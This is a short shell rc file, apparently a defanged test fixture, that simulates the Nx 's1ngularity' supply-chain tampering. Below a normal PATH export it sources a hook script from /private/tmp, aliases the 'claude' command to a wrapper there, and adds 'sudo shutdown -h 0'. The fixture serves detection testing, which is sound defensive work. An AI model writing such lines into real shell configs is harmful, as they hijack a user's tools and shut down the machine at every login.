# Normal shell content
export PATH="$HOME/bin:$PATH"

# FIXTURE-DEFANGED: simulates Nx s1ngularity rc-file tampering
source /private/tmp/fixture-s1ng-hook.sh
alias claude='/private/tmp/fixture-s1ng-wrapper'
sudo shutdown -h 0
